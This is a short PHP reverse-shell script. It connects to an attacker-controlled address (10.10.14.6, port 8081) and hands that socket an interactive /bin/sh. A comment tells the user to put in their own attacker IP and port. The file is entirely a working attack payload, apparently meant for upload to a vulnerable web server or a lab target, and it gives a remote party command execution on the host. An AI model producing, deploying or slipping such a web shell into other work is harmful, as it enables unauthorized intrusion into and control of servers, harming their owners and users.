<?php
// Replace 'YOUR_IP' with your attacker's IP address and 'YOUR_PORT' with the desired port
$sock = fsockopen("10.10.14.6", 8081);
$proc = proc_open("/bin/sh -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>

